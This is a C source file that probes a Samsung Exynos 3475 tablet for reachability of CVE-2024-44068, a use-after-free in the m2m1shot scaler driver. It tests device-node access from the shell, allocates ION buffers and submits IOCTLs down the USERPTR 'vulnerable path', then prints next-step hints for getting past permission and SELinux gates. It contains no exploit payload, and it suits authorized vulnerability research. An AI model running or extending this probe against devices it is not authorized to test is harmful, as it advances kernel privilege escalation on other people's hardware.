/*
 * m2m1shot_access_probe.c — Check if we can open the m2m1shot scaler
 * and probe the CVE-2024-44068 PFNMAP UAF pattern on Exynos 3475.
 *
 * Phase 1: Access test — can we open the device from shell UID?
 * Phase 2: Basic IOCTL probe — can we submit a M2M1SHOT_IOC_PROCESS?
 * Phase 3: PFNMAP buffer test — does it accept ION-mmaped userptrs?
 *
 * Build: qemu\build-arm.bat src\m2m1shot\m2m1shot_access_probe.c m2m1shot_access_probe
 * Run:   adb shell /data/local/tmp/m2m1shot_access_probe
 *
 * SAFETY: This probe does NOT attempt exploitation. It only tests
 * access gates and reports what the device accepts/rejects.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* ---- m2m1shot UAPI definitions (from include/uapi/linux/m2m1shot.h) ---- */

#define M2M1SHOT_MAX_PLANES 3

struct m2m1shot_pix_format {
    unsigned int fmt;
    unsigned int width;
    unsigned int height;
    struct {
        int left;
        int top;
        unsigned int width;
        unsigned int height;
    } crop;
};

#define M2M1SHOT_BUFFER_NONE    0
#define M2M1SHOT_BUFFER_DMABUF  1
#define M2M1SHOT_BUFFER_USERPTR 2

struct m2m1shot_buffer_plane {
    union {
        int fd;
        unsigned long userptr;
    };
    unsigned long len;
};

struct m2m1shot_buffer {
    struct m2m1shot_buffer_plane plane[M2M1SHOT_MAX_PLANES];
    unsigned char type;
    unsigned char num_planes;
};

struct m2m1shot_operation {
    short quality_level;
    short rotate;
    unsigned int op;
};

struct m2m1shot {
    struct m2m1shot_pix_format fmt_out;
    struct m2m1shot_pix_format fmt_cap;
    struct m2m1shot_buffer buf_out;
    struct m2m1shot_buffer buf_cap;
    struct m2m1shot_operation op;
    unsigned long reserved[2];
};

#define M2M1SHOT_IOC_PROCESS _IOWR('M', 0, struct m2m1shot)

/* ---- ION definitions ---- */

struct ion_allocation_data {
    unsigned long len;
    unsigned long align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};

struct ion_fd_data {
    int handle;
    int fd;
};

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_MAP   _IOWR(ION_IOC_MAGIC, 2, struct ion_fd_data)

/* V4L2 pixel formats */
#define V4L2_PIX_FMT_NV12    0x3231564E
#define V4L2_PIX_FMT_RGB565  0x50424752

static const char *scaler_paths[] = {
    "/dev/m2m1shot_scaler0",
    "/dev/m2m1shot_scaler1",
    "/dev/m2m1shot_jpeg",
    NULL
};

static void phase1_access_test(void)
{
    printf("\n=== PHASE 1: Device access test ===\n");

    for (int i = 0; scaler_paths[i]; i++) {
        int fd = open(scaler_paths[i], O_RDWR);
        if (fd >= 0) {
            printf("[+] OPEN SUCCESS: %s (fd=%d)\n", scaler_paths[i], fd);
            close(fd);
        } else {
            printf("[-] OPEN FAILED:  %s -- %s (errno=%d)\n",
                   scaler_paths[i], strerror(errno), errno);
            if (errno == EACCES)
                printf("    -> DAC permission denied (need media/graphics group)\n");
            else if (errno == EPERM)
                printf("    -> SELinux or capability denied\n");
        }
    }
}

static int ion_alloc_and_map(int ion_fd, unsigned long size, int *out_dma_fd, void **out_ptr)
{
    struct ion_allocation_data alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.len = size;
    alloc.align = 4096;
    alloc.heap_id_mask = 1;  /* ION_HEAP_SYSTEM (bit 0) */
    alloc.flags = 0;

    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        printf("[-] ION_IOC_ALLOC failed: %s\n", strerror(errno));
        return -1;
    }

    struct ion_fd_data share;
    memset(&share, 0, sizeof(share));
    share.handle = alloc.handle;
    if (ioctl(ion_fd, ION_IOC_MAP, &share) < 0) {
        printf("[-] ION_IOC_MAP failed: %s\n", strerror(errno));
        return -1;
    }

    *out_dma_fd = share.fd;
    *out_ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, share.fd, 0);
    if (*out_ptr == MAP_FAILED) {
        printf("[-] mmap ION buffer failed: %s\n", strerror(errno));
        close(share.fd);
        return -1;
    }

    printf("[+] ION alloc %lu bytes: handle=%d, dma_fd=%d, ptr=%p\n",
           size, alloc.handle, share.fd, *out_ptr);
    return 0;
}

static void phase2_ioctl_probe(void)
{
    int scaler_fd, ion_fd;
    int in_dma_fd = -1, out_dma_fd = -1;
    void *in_ptr = NULL, *out_ptr = NULL;
    unsigned long buf_size = 64 * 64 * 3 / 2;  /* tiny 64x64 NV12 */

    printf("\n=== PHASE 2: IOCTL probe ===\n");

    scaler_fd = open("/dev/m2m1shot_scaler0", O_RDWR);
    if (scaler_fd < 0) {
        printf("[-] Cannot open scaler for IOCTL test: %s\n", strerror(errno));
        printf("    Skipping IOCTL probe.\n");
        return;
    }
    printf("[+] Scaler opened (fd=%d)\n", scaler_fd);

    ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) {
        printf("[-] Cannot open /dev/ion: %s\n", strerror(errno));
        close(scaler_fd);
        return;
    }

    if (ion_alloc_and_map(ion_fd, buf_size, &in_dma_fd, &in_ptr) < 0)
        goto cleanup;
    if (ion_alloc_and_map(ion_fd, buf_size, &out_dma_fd, &out_ptr) < 0)
        goto cleanup;

    memset(in_ptr, 0x42, buf_size);

    /* --- Test A: DMABUF mode (normal path) --- */
    {
        struct m2m1shot task;
        int ret;
        memset(&task, 0, sizeof(task));

        task.fmt_out.fmt = V4L2_PIX_FMT_NV12;
        task.fmt_out.width = 64;
        task.fmt_out.height = 64;
        task.fmt_cap.fmt = V4L2_PIX_FMT_NV12;
        task.fmt_cap.width = 64;
        task.fmt_cap.height = 64;

        task.buf_out.type = M2M1SHOT_BUFFER_DMABUF;
        task.buf_out.num_planes = 1;
        task.buf_out.plane[0].fd = in_dma_fd;
        task.buf_out.plane[0].len = buf_size;

        task.buf_cap.type = M2M1SHOT_BUFFER_DMABUF;
        task.buf_cap.num_planes = 1;
        task.buf_cap.plane[0].fd = out_dma_fd;
        task.buf_cap.plane[0].len = buf_size;

        ret = ioctl(scaler_fd, M2M1SHOT_IOC_PROCESS, &task);
        if (ret == 0)
            printf("[+] M2M1SHOT_IOC_PROCESS (DMABUF): SUCCESS\n");
        else
            printf("[*] M2M1SHOT_IOC_PROCESS (DMABUF): ret=%d, %s (errno=%d)\n",
                   ret, strerror(errno), errno);
    }

    /* --- Test B: USERPTR mode (the vulnerable path) --- */
    {
        struct m2m1shot task;
        int ret;
        memset(&task, 0, sizeof(task));

        task.fmt_out.fmt = V4L2_PIX_FMT_NV12;
        task.fmt_out.width = 64;
        task.fmt_out.height = 64;
        task.fmt_cap.fmt = V4L2_PIX_FMT_NV12;
        task.fmt_cap.width = 64;
        task.fmt_cap.height = 64;

        task.buf_out.type = M2M1SHOT_BUFFER_USERPTR;
        task.buf_out.num_planes = 1;
        task.buf_out.plane[0].userptr = (unsigned long)in_ptr;
        task.buf_out.plane[0].len = buf_size;

        task.buf_cap.type = M2M1SHOT_BUFFER_USERPTR;
        task.buf_cap.num_planes = 1;
        task.buf_cap.plane[0].userptr = (unsigned long)out_ptr;
        task.buf_cap.plane[0].len = buf_size;

        ret = ioctl(scaler_fd, M2M1SHOT_IOC_PROCESS, &task);
        if (ret == 0)
            printf("[+] M2M1SHOT_IOC_PROCESS (USERPTR): SUCCESS -- vulnerable path reached!\n");
        else
            printf("[*] M2M1SHOT_IOC_PROCESS (USERPTR): ret=%d, %s (errno=%d)\n",
                   ret, strerror(errno), errno);
    }

cleanup:
    if (in_ptr && in_ptr != MAP_FAILED) munmap(in_ptr, buf_size);
    if (out_ptr && out_ptr != MAP_FAILED) munmap(out_ptr, buf_size);
    if (in_dma_fd >= 0) close(in_dma_fd);
    if (out_dma_fd >= 0) close(out_dma_fd);
    close(ion_fd);
    close(scaler_fd);
}

int main(void)
{
    printf("m2m1shot access probe -- CVE-2024-44068 pattern check\n");
    printf("Target: Samsung SM-T377A (Exynos 3475), kernel 3.10.9\n");
    printf("UID: %d, GID: %d, PID: %d\n", getuid(), getgid(), getpid());

    phase1_access_test();
    phase2_ioctl_probe();

    printf("\n=== Interpretation ===\n");
    printf("If Phase 1 OPEN SUCCESS: DAC gate passed, proceed.\n");
    printf("If Phase 1 EACCES:       Need media/graphics group. Try from app.\n");
    printf("If Phase 2 USERPTR OK:   m2m1shot accepts user buffers -- CVE path LIVE.\n");
    printf("If Phase 2 EPERM:        SELinux blocks -- need mediaserver context.\n");

    return 0;
}
